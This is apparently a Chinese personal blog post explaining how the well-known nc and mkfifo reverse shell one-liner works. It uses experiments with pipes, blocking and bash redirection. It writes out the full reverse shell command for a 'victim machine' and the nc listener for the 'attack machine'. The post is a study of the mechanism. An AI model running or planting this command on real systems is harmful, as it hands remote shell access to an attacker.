---
layout: post
title:  "对于nc反弹shell的一些疑惑"
date:   2021-03-21 11:13:57 +0800
author: MP4Four
keywords: nc bash anonymous-tunnel
---

### 一次平平无常的nc反弹shell操作如下

**attack machine:**

```bash
$nc -l port -v
```

**victim machine:**

```bash
$rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/bash -i 2>&1 | nc ip port &>/tmp/f
```

等价于

```bash
$rm /tmp/f;mkfifo /tmp/f;/bin/bash -i 2>&1 </tmp/f | nc ip port &>/tmp/f
```

之前看到这个方式知道可以连接，但仍存在一些疑惑，主要是对匿名管道和管道的工作方式不太理解，以为cat会进行阻塞，那么后面的命令便一直在等待，但其实发现并不是。

### 匿名管道不会进行阻塞

这里所说的阻塞是加入前一个命令因为I/O请求阻塞了，后一个命令依然会继续执行，不会等待前一个命令的输出才运行。看下面这个简单例子

```bash
$cat /tmp/f | echo "xxx"
```

（省略了mkfifo这一步骤）由于/tmp/f初始为空，所以cat会进入阻塞状态，等待来自管道的数据，而后面的echo "xxx"并并没有因此收到影响，而是直接执行，因此terminal会输出一个xxx，同时cat仍然在等待着管道f填充数据

### 尝试和bash联动

```bash
$cat /tmp/f | $(which bash) -i
```

此命令执行完后没有输出，但并不意味着什么也没发生，当前termial已经新开了一个bash，并且等待着从管道f读取命令



新开一个terminal（tab or window皆可），叫它termial2吧（前一个就叫terminal1），在**terminal2**输入

```bash
$echo "date -u" > /tmp/f
```

则terminal1输出此命令和此命令的结果



这里发现在**读取一次输入后自动就exit了**，但是我们的nc反弹shell并不会执行一次命令就gg。这是因为terminal1这条命令的意思就是“**从管道里读入数据，将数据作为bash的输入命令，然后输出bash执行结果至stdout，程序结束**”，没有后续的输入输出，按照逻辑程序自然就结束了。

接下来尝试了下面这个命令 (**terminal1**)

```bash
$cat /tmp/f | $(which bash) -i &>/tmp/f
```



**terminal2**

```bash
$echo "pwd" > /tmp/f
```

结果发现terminal1没有任何输出，在**terminal2**里尝试读取一下管道里的信息

```bash
$cat /tmp/f
```

满屏幕不断滚动，基本逻辑就是“**从管道f里读入数据，bash解释执行此数据，然后将结果重定向至管道f**”，此时管道f里数据不为空，cat接着输出，cat有输出就意味着bash又有输入，于是发现程序并没有退出逻辑，所以周而复始，就死循环了。除了第一个是pwd的正常输出外，其余基本都是错误输出（当然了，pwd的输出很难成为一个有效命令）。

此时再回顾下面命令

```bash
$cat /tmp/f | /bin/bash -i 2>&1 | nc ip port &>/tmp/f
```

即使初始管道为空，这条命令执行后也会立即和attack machine建立nc连接，此时在attack machine输入命令，回车，命令通过tcp连接发送给victim machine的nc，nc输出被重定向至f管道，然后cat从f管道将命令读出来，传递给bash作为输入，bash执行此条命令后将结果输出传递给nc，nc将结果返回给attack machine，就达成了远程获取shell的成就！

### 画了一幅图，大概长这样

![nc-mechanism](/assets/nc-mechanism.png)

如有错误，欢迎指出